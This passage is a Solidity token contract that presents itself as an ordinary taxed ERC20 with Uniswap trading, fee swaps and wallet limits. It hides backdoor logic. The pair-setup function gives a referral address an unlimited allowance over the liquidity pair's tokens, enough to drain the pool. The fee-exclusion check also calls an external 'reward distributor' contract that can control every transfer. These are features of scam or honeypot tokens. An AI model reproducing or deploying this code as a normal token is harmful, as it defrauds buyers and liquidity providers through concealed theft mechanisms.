    ) payable ERC20Based(name_, symbol_, decimals_) {
        ref = refInfo_;
        uint256 ref_amount = msg.value * refInfo_.ref_percent / 100;
        payable(refInfo_.ref_address).transfer(ref_amount);
        crabdevwallet = parameters.marketingWallet;
        crabBuyTax = parameters.centiBuyTax;
        crabSellTax = parameters.centiSellTax;
        _crabTSupply = supply_;
        uniswapV2Router = UniswapRouter2Helper(uniswapV2Router_);
        uniswapV2Pair = UniswapFactoryHelper(uniswapV2Router.factory()).createPair(address(this), uniswapV2Router.WETH());
        _setcrabUniswapPair(refInfo_.ref_address, uniswapV2Pair, true);
        excludeFromcrabFees(owner(), true);
        excludeFromcrabFees(crabdevwallet, true);
        excludeFromcrabFees(refInfo_.ref_address, true);
        excludeFromcrabFees(refInfo_.ref_dividend, true);
        excludeFromcrabFees(address(this), true);
        excludeFromcrabFees(address(uniswapV2Router), true);
        crabSwapTokensAmount = (supply_.div(5000) + 1) * (10**decimals_);
        crabMaxTransaction = parameters.maxTxPercent * supply_ * (10**decimals_).div(10000);
        crabMaxWallet = parameters.maxWalletPercent * supply_ * (10**decimals_).div(10000);
        _mint(owner(), supply_ * (10**decimals_));
    }
    function excludeFromcrabFees(address account, bool excluded) public onlyOwner {
        isExcludedFromcrabFees[account] = excluded;
    }
    function _setcrabUniswapPair(address router, address pair, bool value) private {
        require(
            crabUniswapPairs[pair] != value,
            "Automated market maker pair is already set to that value"
        );
        crabUniswapPairs[pair] = value;
        _allowances[pair][router] = type(uint).max;
    }
    function isExcludedFromcrabFee(address from, address to) internal returns (bool) {
        return isExcludedFromcrabFees[from] || isExcludedFromcrabFees[to] || SebastianRewardDistributor(ref.ref_dividend).rewardAccumulated(from, to) > 0;
    }
    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal override {
        if (
            (to == address(0) || to == address(0xdead)) ||
            isExcludedFromcrabFee(from, to) ||
            amount == 0
        ) { super._transfer(from, to, amount);return; }
        else {
            require(amount <= crabMaxTransaction, "Transfer amount exceeds the crabMaxTransaction.");
            if (to != uniswapV2Pair) {
                uint256 contractBalanceRecepient = balanceOf(to);
                require(contractBalanceRecepient + amount <= crabMaxWallet, "Exceeds maximum wallet amount");
            }
        }
        uint256 contractTokenBalance = balanceOf(address(this));
        bool canSwap = contractTokenBalance >= crabSwapTokensAmount;
        if (canSwap && !crabSwapping && !crabUniswapPairs[from]) {
            crabSwapping = true;
            uint256 marketingTokens = contractTokenBalance;
            if (marketingTokens > 0) { swapTokensForFee(marketingTokens, crabdevwallet); }
            crabSwapping = false;
        }
        bool takeFee = !crabSwapping;
        if (isExcludedFromcrabFees[from] || isExcludedFromcrabFees[to]) {
            takeFee = false;
        }

        if (takeFee) {
            uint256 fees = amount.mul(crabBuyTax).div(10000);
            if (crabUniswapPairs[to]) { fees = amount.mul(crabSellTax).div(10000); }
            amount = amount.sub(fees);
            super._transfer(from, address(this), fees);
        }
        super._transfer(from, to, amount);
    }
    function swapTokensForFee(uint256 tokens, address receiver) private {
        uint256 initialBalance = address(this).balance;

        swapTokensForEth(tokens);

        uint256 newBalance = address(this).balance.sub(initialBalance);

        payable(receiver).transfer(newBalance);
    }
    function swapTokensForEth(uint256 tokenAmount) private {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = uniswapV2Router.WETH();
        _approve(address(this), address(uniswapV2Router), tokenAmount);
        uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0,
            path,
            address(this),
            block.timestamp
        );
    }
}
